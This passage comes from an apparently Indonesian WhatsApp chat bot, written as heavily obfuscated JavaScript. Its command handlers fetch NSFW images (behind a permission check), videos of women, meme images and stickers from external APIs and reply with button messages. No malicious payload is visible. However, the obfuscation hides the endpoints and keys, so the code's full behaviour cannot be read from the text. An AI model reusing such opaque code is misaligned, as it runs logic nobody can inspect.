buttonsx_=[_0x17477c,_0x421c0a],btnx_={'contentText':lang[_0x406083(0x72b,0x70e,0x299,0xc0e)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x4aaba1(0x4fa,0x7c3,0x5a6,0x180)+'\x20by\x20@')+sender['split']('@')[0x1*0x2223+0x1e+0x3*-0xb6b],'buttons':buttonsx_,'headerType':0x5,'videoMessage':bacotlux_['message'][_0x406083(0xd1b,0xd5c,0xd4c,0x9a8)+'ge']},_0x4bd84b={};_0x4bd84b[_0x4aaba1(0x88d,0xa3e,0xc95,0x920)+'id']=[sender];const _0x1c3f8f={};_0x1c3f8f[_0x406083(0xcae,0x856,0x1003,0x113d)]=mek,_0x1c3f8f['contextInf'+'o']=_0x4bd84b,alpha[_0x4aaba1(0x8b4,0x45d,0x612,0x54e)+'e'](from,btnx_,MessageType['buttonsMes'+_0x4aaba1(0x4ff,0x516,0x2ef,0x702)],_0x1c3f8f)[_0x406083(0xa96,0xa3f,0xa2b,0xd9b)](_0x2d2cd4=>{function _0x5d8a79(_0x4ce6c4,_0x12c55a,_0x26b5df,_0x1a227d){return _0x406083(_0x1a227d-0x67,_0x12c55a-0x111,_0x26b5df-0xbd,_0x12c55a);}function _0x47a1f1(_0x4e10f5,_0x467866,_0x43be9e,_0x5392cd){return _0x4aaba1(_0x467866-0x10c,_0x43be9e,_0x43be9e-0x7a,_0x5392cd-0x19e);}reply(_0x47a1f1(0x357,0x755,0xb77,0x2ae)+_0x5d8a79(-0xa,0x58d,0x65d,0x454)+_0x47a1f1(0x120,0x556,0x9be,0x5c6)+_0x47a1f1(0x94b,0xb94,0xef5,0xba8)+'gi');});break;case _0x406083(0x426,0x249,0xf7,0xe7):case _0x406083(0x6d1,0xb6b,0x8dd,0xa6c):case _0x406083(0xa05,0x581,0x82d,0xa5e):case _0x406083(0xa7c,0x949,0xa36,0xaa3):case _0x406083(0x881,0xc0f,0x925,0x792):case _0x4aaba1(0xba0,0xa2a,0x104e,0xba7):case _0x406083(0x800,0x7e4,0x3cc,0xc02):case _0x4aaba1(0xb16,0xbb6,0xfc9,0xdbc):case _0x406083(0x76e,0x7d6,0x9d6,0xa80):case _0x406083(0x77f,0x61a,0x7f5,0x785):case _0x4aaba1(0x903,0x6b2,0x625,0x841):case _0x4aaba1(0xd1b,0xbc2,0xf6c,0xf60):case'fox_girl':case'tits':case _0x4aaba1(0xda4,0xa25,0xe9f,0x96e):case _0x406083(0xc10,0xb58,0x8c0,0xd93):case'lizard':case _0x406083(0xd88,0x1161,0xd13,0xfcf):case _0x406083(0xb09,0xb2d,0x7f0,0x83a):case _0x4aaba1(0xd0d,0x92d,0xb9a,0x922):case _0x4aaba1(0x64e,0xab6,0x3ba,0x1b0):case _0x406083(0x938,0xd3d,0x9ab,0xac3):case _0x406083(0xcf5,0xefa,0xb3e,0xdee):case'kemonomimi':case _0x406083(0x3f1,-0x43,0xeb,0x16c):case'nsfw_avata'+'r':case'erofeet':case _0x406083(0x3b6,0x121,0x5f2,-0x50):case _0x406083(0xbe6,0x6c9,0x7f5,0x97a):case'blowjob':case _0x406083(0x659,0x45c,0x6e2,0x608):case _0x406083(0xc3c,0x1129,0xb48,0x1152):case _0x406083(0x37c,0x4b1,0x2c4,0x118):case _0x4aaba1(0x3a6,0xd,0x14a,0x692):case'pussy_jpg':case'futanari':case _0x406083(0xced,0xe5b,0x1135,0xc76):if(!isNsfw&&!mek[_0x4aaba1(0x488,-0x49,0x75c,0x990)][_0x4aaba1(0xd71,0xfe2,0x125d,0xdaf)]&&!isOwner&&!isCreator)return reply(lang[_0x4aaba1(0x71c,0x4e7,0xbfc,0xa7d)]());var ini_img=await fetchJson(_0x4aaba1(0x689,0x5ea,0x747,0xade)+_0x406083(0xb77,0x6c3,0xe82,0x94c)+_0x406083(0x911,0x80e,0xa5b,0x936)+command),ini_img_=await getBuffer(ini_img[_0x4aaba1(0xa11,0x7c9,0xc1d,0x6f3)]);const mediax=await alpha['prepareMes'+_0x4aaba1(0x4ff,0x386,0x62,0x3af)](from,ini_img_,MessageType['image'],{'thumbnail':Buffer[_0x4aaba1(0x76c,0x51e,0x8b6,0x91a)](0xfa*0x6+-0x1e6+-0x3f6)});let bacotlux=mediax[_0x4aaba1(0x49c,0x231,0x5f7,0x6c7)][_0x406083(0x8f0,0xcba,0x626,0x4b3)+_0x4aaba1(0xa98,0x98e,0xbfe,0xdab)]?mediax[_0x406083(0x467,0x6ac,0x249,0x3c6)]['ephemeralM'+_0x406083(0xa63,0x6d1,0xcbf,0xeed)]:mediax;const _0x263996={};_0x263996[_0x406083(0x50e,0x36b,0x464,0x5f8)+'t']=_0x4aaba1(0x48f,0x5d8,0x8ba,0x29d);const _0x1b3ae5={};_0x1b3ae5[_0x4aaba1(0x78d,0x800,0x8b4,0x7f5)]=_0x4aaba1(0xd52,0xede,0xa74,0xc8e),_0x1b3ae5[_0x406083(0x6b4,0x303,0x1a3,0xbc5)]=_0x263996,_0x1b3ae5['type']=0x1;const _0x1bdba0={};_0x1bdba0[_0x4aaba1(0x543,0x750,0x9ce,0x6e)+'t']='Next\x20➡️';const _0x341ce5={};_0x341ce5[_0x4aaba1(0x78d,0x5d4,0x357,0x8b0)]=''+command,_0x341ce5[_0x4aaba1(0x6e9,0x6bb,0x867,0x42e)]=_0x1bdba0,_0x341ce5[_0x4aaba1(0x816,0x596,0x405,0xb0a)]=0x1;const buttonsx=[_0x1b3ae5,_0x341ce5],btnx__={'contentText':lang[_0x406083(0x72b,0x660,0xa1f,0x5ef)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x406083(0x4c5,0x56b,0x52,0x75d)+_0x406083(0xc84,0x10ea,0xb44,0x9f1))+sender['split']('@')[0xb93+-0x61a+-0x579],'buttons':buttonsx,'headerType':0x4,'imageMessage':bacotlux[_0x406083(0x467,0x190,0x6bd,0x921)]['imageMessa'+'ge']},_0x2b8b46={};_0x2b8b46[_0x4aaba1(0x88d,0x71d,0x7b2,0x430)+'id']=[sender];const _0x436e49={};_0x436e49[_0x406083(0xcae,0x860,0x963,0xe0b)]=mek,_0x436e49[_0x4aaba1(0x887,0xd99,0xd39,0x9c0)+'o']=_0x2b8b46,alpha['sendMessag'+'e'](from,btnx__,MessageType[_0x4aaba1(0xa29,0xd04,0xe14,0xa80)+'sage'],_0x436e49)[_0x406083(0xa96,0xb25,0xac8,0xd83)](_0x21f1e7=>{const _0x57ec37={'RWkBF':function(_0x4c474d,_0x9ac4f0){return _0x4c474d(_0x9ac4f0);},'wjzic':_0x2eab75(0xad,0xa3,0x22f,0x459)+_0x164ab9(-0x84,0x283,0x46,0x8a)+'oba\x20bebera'+_0x2eab75(0xbce,0x633,0xc1e,0x898)+'gi'};function _0x164ab9(_0x4cbeed,_0x33933e,_0x59e50b,_0x3770b4){return _0x406083(_0x59e50b- -0x3a7,_0x33933e-0x35,_0x59e50b-0x132,_0x3770b4);}function _0x2eab75(_0x322e03,_0xc7d8bd,_0x143b95,_0x5ece92){return _0x406083(_0x5ece92- -0x1bb,_0xc7d8bd-0x170,_0x143b95-0x55,_0x322e03);}_0x57ec37[_0x2eab75(0xbb1,0xab9,0x4ff,0x72a)](reply,_0x57ec37[_0x2eab75(-0x10f,0x77f,0xb1,0x2d5)]);});break;case'amongus':const pref=_0x4aaba1(0x884,0xad6,0xc2f,0x65e)+enter+(_0x4aaba1(0x5fd,0x4f2,0x220,0x7bf)+'sername\x0aim'+_0x4aaba1(0x744,0xbd7,0xa20,0x98f)+_0x4aaba1(0x4eb,0x80c,0x3f4,0x45b)+_0x4aaba1(0xddb,0xcec,0x1231,0xf2e)+_0x4aaba1(0xd87,0x10b4,0xa43,0xf69)+_0x4aaba1(0x3f2,0x484,0x116,0x133)+_0x406083(0xb97,0xeb1,0xad3,0x7dd)+'wn|cyan|da'+_0x4aaba1(0xc46,0x986,0x8d7,0xf32)+'me|orange|'+_0x4aaba1(0x446,0x49b,0x856,0x7b2)+_0x4aaba1(0x3d3,0x3cd,0x45,0x58)+_0x4aaba1(0x599,0xbf,0x23e,0xa52))+enter+enter+_0x406083(0x9c8,0x9b1,0xb50,0x5c2)+enter+'\x20'+prefix+('amongus\x20\x20c'+_0x4aaba1(0x511,0x182,0x70f,0x5c2)+_0x4aaba1(0x57b,0x671,0x2be,0x508));if(args[_0x4aaba1(0x7cc,0x9c2,0x6cb,0x4e9)]<0x13fa*-0x1+-0x829*-0x4+0x1cf*-0x7)return reply(pref);var kntl_=args[_0x4aaba1(0xb12,0x67f,0xcc3,0xc7b)]('\x20'),nama_=kntl_[_0x406083(0x676,0x409,0xac5,0x7d3)]('|')[-0x3*0xc87+0x1*0x261d+-0x88],impostor_=kntl_[_0x4aaba1(0x6ab,0xbd3,0x4ec,0x436)]('|')[-0x16bc+0x1deb+0x2*-0x397],color_=kntl_[_0x406083(0x676,0x453,0x439,0xa0b)]('|')[-0x243c+-0x11c6+0x3604];const _0xc6bd65={};_0xc6bd65[_0x4aaba1(0xbc7,0x9f6,0x10b4,0xa27)]='get';var amongus=await getBuffer(_0x4aaba1(0x4ca,0x24,0x884,0x696)+_0x4aaba1(0x570,0x487,0x606,0x909)+'api/ejecte'+_0x406083(0x8dd,0x834,0xb0d,0xd05)+nama_+_0x406083(0xa03,0xe69,0x75b,0x4dd)+impostor_+_0x406083(0xafb,0x7a0,0x5ee,0x6f7)+color_,_0xc6bd65);amongusp=''+lang[_0x406083(0x72b,0x2b7,0x3cd,0x223)]()+enter+enter+(_0x406083(0x382,0x28a,0x3b7,0x4ea)+_0x4aaba1(0xac1,0x8dc,0xcbc,0xa61)+'ps://youtu'+_0x4aaba1(0xaba,0xdca,0xdfe,0x640)+_0x406083(0x5ff,0x998,0xa9c,0x6e3)),alpha['sendMessag'+'e'](from,amongus,image,{'thumbnail':Buffer['alloc'](-0x1876+-0x158*-0x4+0x1316),'caption':lang[_0x4aaba1(0x760,0xbb1,0x894,0x9e3)](),'quoted':mek});break;case _0x4aaba1(0xc66,0xfb3,0x972,0x9c2):case _0x406083(0x3f0,0x310,0x47,0x393):case'tweet':let trump=args[_0x4aaba1(0xb12,0xdcb,0x71c,0x820)]('\x20');const _0x3a2b54={};_0x3a2b54['method']=_0x4aaba1(0x86a,0x4a9,0x690,0x5ff);let trump1=await fetchJson(_0x406083(0x654,0x809,0x29f,0x759)+_0x4aaba1(0xb59,0xdda,0xc51,0x64a)+_0x406083(0x4a2,0x55f,0x46,0x709)+'en?type=tr'+_0x4aaba1(0x7a5,0x8d6,0x665,0x629)+_0x406083(0xbe8,0xf61,0xac1,0x7ad)+trump+_0x4aaba1(0x401,0x440,-0x5,0x3a9),_0x3a2b54),trump2=await getBuffer(trump1[_0x406083(0x467,0x3d9,0x744,0x954)]);alpha['sendMessag'+'e'](from,trump2,image,{'thumbnail':Buffer['alloc'](0x11e4*0x1+-0x169f+0x4bb),'caption':lang[_0x406083(0x72b,0x5cd,0x886,0x821)](),'quoted':mek});break;case _0x406083(0x54e,0x13a,0xa3f,0x1fd):let cmm=args['join']('\x20');const _0x7c7504={};_0x7c7504[_0x406083(0xb92,0xc09,0xc80,0xd40)]='get';let anuuu=await fetchJson(_0x4aaba1(0x689,0xb94,0x684,0xa52)+_0x4aaba1(0xb59,0x904,0xa7b,0x7ab)+'api/imageg'+_0x4aaba1(0xa2c,0xd6f,0xc9c,0x693)+_0x406083(0x8b7,0x7df,0x43d,0x80b)+_0x406083(0x3aa,-0x116,0xf5,0x200)+cmm+_0x4aaba1(0x401,0x8a0,0x592,0x527),_0x7c7504),bbuffer=await getBuffer(anuuu[_0x406083(0x467,0x1f4,0x973,0x8bf)]);alpha[_0x406083(0x87f,0x5bc,0xacc,0xbb4)+'e'](from,bbuffer,image,{'thumbnail':Buffer['alloc'](-0x9*-0x1f1+-0x7*0x409+0xac6),'caption':lang[_0x406083(0x72b,0x23f,0x815,0x6df)](),'quoted':mek});break;case _0x406083(0xd51,0x10b6,0xac7,0xc59):let kanna=args[_0x4aaba1(0xb12,0xf99,0xa1e,0xc2a)]('\x20');const _0x77c7d3={};_0x77c7d3[_0x4aaba1(0xbc7,0xc88,0xdd6,0xa3a)]=_0x4aaba1(0x86a,0x868,0xd07,0x9ce);var anu_=await fetchJson(_0x406083(0x654,0x44a,0x31a,0x832)+_0x4aaba1(0xb59,0xccf,0xdd8,0xfd5)+_0x4aaba1(0x4d7,-0x2c,0x46f,0x1f6)+'en?type=ka'+_0x406083(0xbb8,0xe74,0x98f,0xf34)+'t='+kanna+_0x406083(0x3cc,0x727,0x410,0x14c),_0x77c7d3);let buffer_h=await getBuffer(anu_[_0x4aaba1(0x49c,0x90b,0xce,0x767)]);alpha[_0x4aaba1(0x8b4,0xb85,0x444,0xcb9)+'e'](from,buffer_h,image,{'thumbnail':Buffer[_0x406083(0x737,0x708,0xb0a,0x80f)](-0x665+0xb*0x36+-0x95*-0x7),'caption':lang['success'](),'quoted':mek});break;case _0x4aaba1(0xc00,0x89d,0x10a8,0x1127):case _0x406083(0x9ad,0xb73,0x951,0xe70):case _0x406083(0xd12,0xab3,0xb31,0xa98):case _0x406083(0x3f7,0x418,0x5a,0x3b8):case'dino_kunin'+'g':case _0x406083(0x90f,0x624,0xa7b,0x4c6):case'gojosatoru':case _0x4aaba1(0xc7d,0xe42,0x10be,0xecd):case'jisoo':case _0x406083(0xa58,0x73f,0x690,0xe3a):case _0x406083(0xbd2,0x8de,0xbef,0x6f7):case _0x4aaba1(0x3ce,0x212,0x856,0x21f):case _0x406083(0x514,0x4cb,0x68d,0xcd)+'di':case'menjamet':case _0x406083(0x3b6,0x712,0x296,-0x12):case'nicholas':case _0x406083(0x3ea,0x34e,-0x3e,0xbd):case _0x406083(0xd7d,0x8c7,0xfcb,0x9ee):case'sponsbob':case'kawan_spon'+'sbob':case _0x406083(0x9e1,0xd83,0xb7f,0x639):reply(lang[_0x406083(0x425,0x373,0x4f1,0x44)]());var telestc=await fetchJson(_0x406083(0x936,0xa5d,0xa12,0x655)+_0x406083(0x757,0x9aa,0x32f,0x6c3)+'.herokuapp'+_0x406083(0x8ac,0xbc0,0x8c1,0xc79)+_0x4aaba1(0xda7,0x11cf,0x1148,0x1172)+_0x406083(0x531,0x990,0x546,0xe0)+command+(_0x4aaba1(0x6e4,0x74c,0x1ef,0x97b)+_0x406083(0xa91,0xb7b,0xae3,0xb4b)));let random_telestc=await getBuffer(telestc[_0x4aaba1(0xb4e,0xb09,0x777,0xe80)]);const _0x1a3f85={};_0x1a3f85['quoted']=fgclink,await alpha[_0x406083(0x87f,0xb94,0xaa5,0x5ca)+'e'](from,random_telestc,sticker,_0x1a3f85);var ini_gopaiyy='Hi\x20'+pushname;const _0x94ab81={};_0x94ab81['displayTex'+'t']=_0x406083(0x68d,0xb88,0x5f2,0x712);const _0x1c97fe={};_0x1c97fe['buttonId']=_0x406083(0x532,0x2d0,0x650,0x91c),_0x1c97fe[_0x4aaba1(0x6e9,0xa8c,0x6c2,0x479)]=_0x94ab81,_0x1c97fe[_0x406083(0x7e1,0xca3,0xa31,0xbb4)]=0x1;const _0x47032a={};_0x47032a[_0x406083(0x50e,0x604,0x1fe,0x79b)+'t']=_0x4aaba1(0x514,0x48f,0x2a0,0x781);const _0xe38b31={};_0xe38b31[_0x4aaba1(0x78d,0x6ff,0xa1a,0x7d1)]=''+command,_0xe38b31[_0x4aaba1(0x6e9,0x2b4,0xb6d,0x87f)]=_0x47032a,_0xe38b31[_0x4aaba1(0x816,0x95c,0xcf0,0xb88)]=0x1;var buttonoss=[_0x1c97fe,_0xe38b31];const _0x4cf79e={};_0x4cf79e[_0x4aaba1(0x886,0x879,0xbe4,0x435)+'t']=ini_gopaiyy,_0x4cf79e['footerText']='Klik\x20next\x20'+_0x4aaba1(0xa61,0x9bb,0x65f,0x8d8)+'icker',_0x4cf79e['buttons']=buttonoss,_0x4cf79e[_0x406083(0xad5,0x9b3,0xa2a,0xf11)]=0x1,buttonMessagepe=_0x4cf79e;const _0x223c4a={};_0x223c4a[_0x4aaba1(0x533,0x7b0,0x967,0x6f8)]='hi',_0x223c4a[_0x406083(0x8cf,0xb0b,0x67e,0x694)+_0x4aaba1(0x9a8,0xa8d,0xeb5,0x758)]=0x3b9aca00,_0x223c4a[_0x406083(0x823,0xb10,0xc3c,0xa1d)+'d']=!![],_0x223c4a['sendEpheme'+'ral']=!![],_0x223c4a[_0x4aaba1(0x88d,0x744,0x3cf,0x535)+'id']=[sender];const _0x33b6a0={};_0x33b6a0[_0x406083(0x478,0x26c,0x56a,0x60d)]=_0x406083(0xbd0,0x8c1,0x851,0xdbd)+'21',_0x33b6a0['contextInf'+'o']=_0x223c4a,_0x33b6a0['quoted']=mek,_0x33b6a0[_0x406083(0x43c,0x1d0,0x53f,0x20)+_0x4aaba1(0x441,0x430,-0x15,0x499)]=!![],alpha[_0x406083(0x87f,0xc17,0x580,0xa95)+'e'](from,buttonMessagepe,MessageType[_0x406083(0x9f4,0x835,0xc24,0x699)+_0x406083(0x4ca,0x7a4,0x700,0xc7)],_0x33b6a0);break;case'chika':case _0x4aaba1(0x89f,0x962,0xa78,0x876):case _0x406083(0x828,0xd15,0xcd2,0x74e):case'bunga':case'aura':case _0x4aaba1(0xad4,0xfee,0x875,0xdb9):case'ziva':case'yana':case _0x406083(0x84e,0x4a8,0x874,0x73c):case _0x4aaba1(0x5d5,0x899,0x26a,0x31d):case _0x4aaba1(0x4fc,0x587,0x23,0x1e3):case _0x406083(0x7d3,0x3ce,0x42d,0x7df):case _0x4aaba1(0xca6,0x1187,0x10c2,0x865):case _0x4aaba1(0xc8b,0xa51,0xa9f,0xd9d):case _0x406083(0xc6d,0xd60,0xf3a,0xdd1):case'rikagusria'+'ni':case _0x406083(0x8e1,0x6c8,0xca2,0xb4d):case _0x4aaba1(0xd15,0xae0,0x10ed,0xeee):case _0x4aaba1(0x5ff,0xaf7,0x326,0x7ea):case _0x406083(0xa13,0xef5,0xa7a,0x910):case _0x406083(0x843,0x4c5,0x75c,0xcba):reply(lang['wait']());var random_asupan=await getBuffer(_0x406083(0x936,0x78e,0x713,0x45a)+'i-alphabot'+_0x4aaba1(0x49e,0x9c5,0x9a,0x830)+_0x4aaba1(0xa43,0x58b,0xcd6,0x819)+_0x406083(0x8b5,0x90a,0xd27,0xaf1)+command+('?apikey=of'+_0x4aaba1(0xac6,0x854,0x99f,0x94c)));const mediaxx=await alpha[_0x406083(0x39f,0x154,0x7f1,0x192)+_0x4aaba1(0x4ff,0x508,0x98f,0x36f)](from,random_asupan,MessageType['video'],{'thumbnail':Buffer[_0x4aaba1(0x76c,0x6dc,0x7da,0x5c1)](-0xa46+0x1*0xf7b+-0x535)});let bacotluxx=mediaxx[_0x4aaba1(0x49c,0x240,0x93b,0x8c3)][_0x406083(0x8f0,0xcc9,0x71d,0x798)+_0x406083(0xa63,0x8de,0xa9c,0xe5d)]?mediaxx[_0x4aaba1(0x49c,0x497,0x31,0x5e1)]['ephemeralM'+_0x4aaba1(0xa98,0x74d,0x8d4,0x669)]:mediaxx;const _0x13c57a={};_0x13c57a[_0x4aaba1(0x543,0x345,0x274,0x234)+'t']=_0x4aaba1(0x48f,0x35f,0x73f,0x997);const _0x270d65={};_0x270d65[_0x4aaba1(0x78d,0x292,0xc84,0x531)]=_0x4aaba1(0xd52,0xc71,0xc26,0xcbb),_0x270d65[_0x4aaba1(0x6e9,0x725,0x8bc,0x3ca)]=_0x13c57a,_0x270d65['type']=0x1;const _0x105176={};_0x105176[_0x4aaba1(0x543,0x39d,0x8ed,0x8ef)+'t']='Next\x20➡️';const _0x3fdf44={};_0x3fdf44[_0x4aaba1(0x78d,0x5c9,0x772,0x476)]=''+command,_0x3fdf44[_0x406083(0x6b4,0x443,0x261,0x1fe)]=_0x105176,_0x3fdf44[_0x406083(0x7e1,0x2d0,0x911,0x4e7)]=0x1;const buttonsxx=[_0x270d65,_0x3fdf44],btnx___={'contentText':lang[_0x406083(0x72b,0x6d3,0xc32,0x7a6)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x4aaba1(0x4fa,0x38,0x8ab,0x7a4)+'\x20by\x20@')+sender['split']('@')[0x1645+0x1*-0x186a+-0x1*-0x225],'buttons':buttonsxx,'headerType':0x5,'videoMessage':bacotluxx[_0x406083(0x467,0x34d,0x7c6,0x3f1)][_0x406083(0xd1b,0x925,0xa72,0xd2b)+'ge']},_0x9419a3={};_0x9419a3[_0x4aaba1(0x88d,0x5d5,0x8b3,0x5fa)+'id']=[sender];const _0xba72ce={};_0xba72ce[_0x406083(0xcae,0xa32,0xb61,0x1048)]=mek,_0xba72ce[_0x4aaba1(0x887,0x6ad,0xb21,0xb80)+'o']=_0x9419a3,alpha['sendMessag'+'e'](from,btnx___,MessageType[_0x4aaba1(0xa29,0x8f0,0x64f,0xf3b)+_0x4aaba1(0x4ff,0x5c3,0x48,0x65e)],_0xba72ce)['catch'](_0x5dd4bf=>{function _0x5b2dd5(_0x15ea4a,_0x274f76,_0x58e4a1,_0x388a3e){return _0x406083(_0x15ea4a- -0xbc,_0x274f76-0xae,_0x58e4a1-0x1a9,_0x388a3e);}function _0x25f861(_0x514d97,_0x523962,_0xdfe2f8,_0x2fa9f0){return _0x406083(_0x523962- -0x11b,_0x523962-0x13d,_0xdfe2f8-0x1e7,_0x514d97);}const _0x417e8b={'cQkEQ':function(_0x4d9a11,_0x4c45ee){return _0x4d9a11(_0x4c45ee);},'nUTJu':_0x5b2dd5(0x558,0x1fb,0x641,0x283)+_0x25f861(0x4f0,0x2d2,0x1e1,0x4cf)+_0x5b2dd5(0x359,0x47,0x690,0x85e)+_0x5b2dd5(0x997,0x860,0x578,0xb30)+'gi'};_0x417e8b[_0x5b2dd5(0xc02,0xf5c,0xcf4,0xb28)](reply,_0x417e8b[_0x25f861(0x410,0x8da,0x734,0x643)]);});break;case _0x406083(0x511,0x5e3,0x91c,0x44c):case _0x4aaba1(0xcf4,0xd3c,0xe30,0xc85):case'malaysia':case _0x4aaba1(0x5f8,0xed,0x660,0x2db):case _0x406083(0x387,0x336,0x419,0x104):case _0x406083(0xacc,0x739,0xa71,0x76b):case _0x406083(0xbb2,0xd9c,0xbe7,0x1047):case _0x4aaba1(0x48a,0x235,0x5a,0x443):case _0x406083(0xcf4,0xe22,0xbb5,0xedb):case _0x406083(0xd6b,0x990,0xa81,0xf3d):case _0x4aaba1(0x3e1,0x871,0x1d6,-0x7):reply(lang[_0x406083(0x425,0x7ce,0x3e6,0x1a2)]());var cecan=await fetchJson('https://ap'+_0x4aaba1(0x78c,0xa7f,0xab6,0x351)+_0x406083(0x469,0x32,0x36b,0x8bb)+_0x406083(0x934,0x704,0xd21,0xa48)+'ecan/'+command+(_0x406083(0x6af,0x26f,0xaa1,0xa0e)+_0x4aaba1(0xac6,0xa95,0x931,0xb1a)));let random_cecan=await getBuffer(cecan[_0x406083(0xb19,0xb42,0xb6a,0xe36)]);const mediaxxx=await alpha[_0x4aaba1(0x3d4,-0xd1,0x7a2,0x729)+_0x406083(0x4ca,0xec,0x1e1,0x2ba)](from,random_cecan,MessageType[_0x4aaba1(0x448,0x8d7,0x53,0x152)],{'thumbnail':Buffer[_0x4aaba1(0x76c,0x2f5,0x660,0x3d3)](0x880+-0x5*0x5cb+0x1477)});let bacotluxxx=mediaxxx[_0x406083(0x467,0x895,0x898,0x793)][_0x406083(0x8f0,0xcbd,0x705,0x7db)+'essage']?mediaxxx[_0x4aaba1(0x49c,0x913,0x88d,0x22b)]['ephemeralM'+_0x406083(0xa63,0xa39,0xb8f,0x775)]:mediaxxx;const _0x415e1c={};_0x415e1c['displayTex'+'t']=_0x406083(0x45a,0x87e,0x59a,0x91);const _0x59a338={};_0x59a338[_0x406083(0x758,0x8ff,0xa73,0xb33)]='owner',_0x59a338[_0x406083(0x6b4,0x70f,0x79d,0xb55)]=_0x415e1c,_0x59a338[_0x4aaba1(0x816,0x680,0x309,0xbae)]=0x1;const _0x102b43={};_0x102b43[_0x406083(0x50e,0x89f,0x4c8,0x80e)+'t']=_0x4aaba1(0x514,0x970,0x685,0x647);const _0x310658={};_0x310658[_0x4aaba1(0x78d,0x422,0x8ca,0x871)]=''+command,_0x310658[_0x406083(0x6b4,0x4ae,0xa52,0x573)]=_0x102b43,_0x310658[_0x4aaba1(0x816,0x911,0x5b8,0xbdc)]=0x1;const buttonsxxx=[_0x59a338,_0x310658],btnxx__={'contentText':lang[_0x4aaba1(0x760,0xb24,0x916,0x791)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+('\x20|\x20Request'+_0x4aaba1(0xcb9,0xf32,0x9e1,0xb61))+sender[_0x4aaba1(0x6ab,0xba2,0xbb0,0x2ec)]('@')[0x50b+0xe21+0x4cb*-0x4],'buttons':buttonsxxx,'headerType':0x4,'imageMessage':bacotluxxx[_0x4aaba1(0x49c,0x375,0x6a,0x190)][_0x406083(0x731,0x485,0xb2b,0x96f)+'ge']},_0x2e9dfe={};_0x2e9dfe['mentionedJ'+'id']=[sender];const _0x49b269={};_0x49b269[_0x4aaba1(0xce3,0xa3c,0xbc7,0x919)]=mek,_0x49b269[_0x4aaba1(0x887,0x857,0xc6f,0xbbe)+'o']=_0x2e9dfe,alpha[_0x4aaba1(0x8b4,0x5a3,0x8a5,0x845)+'e'](from,btnxx__,MessageType['buttonsMes'+_0x406083(0x4ca,0x671,0x94e,0x72f)],_0x49b269)[_0x4aaba1(0xacb,0xf1b,0x7e7,0xb1a)](_0x28034e=>{function _0x58d031(_0x58ad6e,_0x249b2e,_0x14e2f7,_0x2970e7){return _0x406083(_0x2970e7- -0x274,_0x249b2e-0x25,_0x14e2f7-0xbc,_0x249b2e);}function _0x11c5b2(_0x439042,_0x454b96,_0x182b47,_0x23312b){return _0x406083(_0x182b47-0xae,_0x454b96-0x6,_0x182b47-0xd9,_0x439042);}const _0x915c4e={'fnRqL':function(_0x43038f,_0x23cae9){return _0x43038f(_0x23cae9);},'lFmcw':_0x11c5b2(0x947,0x37f,0x6c2,0x537)+_0x58d031(0x3a,0x2f8,0x442,0x179)+'oba\x20bebera'+'pa\x20saat\x20la'+'gi'};_0x915c4e[_0x58d031(0x747,0x389,0xae8,0x61c)](reply,_0x915c4e[_0x58d031(0x7bd,0x4d7,0x7b6,0x806)]);});break;case'sc':case _0x406083(0x713,0x9b5,0xa1a,0xc35):case _0x406083(0x789,0xc77,0xa13,0x331):var sjakolan=await getBuffer('https://te'+_0x406083(0x610,0x864,0x13f,0x662)+_0x406083(0x74f,0x2c6,0xb9f,0xb25)+_0x406083(0x53e,0x80f,0x1cc,0x270)+_0x4aaba1(0x6de,0x9fe,0x8f4,0x9dd));const _0x42c903={};_0x42c903[_0x4aaba1(0x543,0x979,0x58a,0x742)+'t']='⋮☰\x20MENU';const _0x523292={};_0x523292['buttonId']=_0x4aaba1(0xade,0xca5,0x810,0xc0d),_0x523292[_0x406083(0x6b4,0xa18,0x681,0x35a)]=_0x42c903,_0x523292[_0x4aaba1(0x816,0x3bb,0xc12,0xa8c)]=0x1;const _0xd6785c={};_0xd6785c['displayTex'+'t']=_0x4aaba1(0x6d3,0x607,0x5b9,0x1cd);const _0x412848={};_0x412848['buttonId']='owner',_0x412848[_0x406083(0x6b4,0x523,0x27a,0x980)]=_0xd6785c,_0x412848['type']=0x1,sendButLocation(from,_0x4aaba1(0x465,0x29d,0x6d2,0x7f0)+_0x4aaba1(0x7af,0xcd3,0xc69,0x3b1)+_0x406083(0x5a7,0x24c,0xa5c,0xa83)+_0x406083(0x448,0x7e,0x12c,0xb7)+_0x406083(0x36d,0x2a2,0x31,0x706)+_0x4aaba1(0xbae,0xe25,0xf79,0xceb),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x4aaba1(0x3da,0x8b9,-0x13d,0x80d)+ini_mark['split']('@')[-0x1ad4+0x1*0xfb5+-0x27*-0x49],sjakolan,[_0x523292,_0x412848],{'contextInfo':{'mentionedJid':[ini_mark]}});break;case _0x406083(0x5d9,0x11b,0x96b,0x33e):sendKatalog(_0x4aaba1(0x9b6,0xc17,0xdd7,0xafa)+_0x4aaba1(0xb24,0xc91,0x60a,0x1018),_0x406083(0xa40,0xce6,0xf55,0x710)+'00',_0x406083(0x439,0x491,0xf0,0x292));break;case _0x4aaba1(0xbc8,0x729,0xefc,0xc32):if(!isOwner&&!mek[_0x406083(0x453,0x16f,0x375,0xf6)]['fromMe'])return reply(_0x4aaba1(0xcff,0x119d,0x114b,0xa86)+'ir\x20🤔');let buffe=fs[_0x4aaba1(0x59d,0x57d,0x20c,0x720)+'nc'](_0x406083(0x587,0x784,0x795,0x7ed)+thumbnail);imeu=await alpha[_0x406083(0x39f,-0x159,0x779,-0xc2)+_0x4aaba1(0x4ff,0x839,0x501,0x65c)](_0x406083(0x6bb,0xa09,0x3bd,0x538)+'pp.net',buffe,image),imeg=imeu[_0x406083(0x467,0x560,0x970,0x1ac)]['imageMessa'+'ge'];const 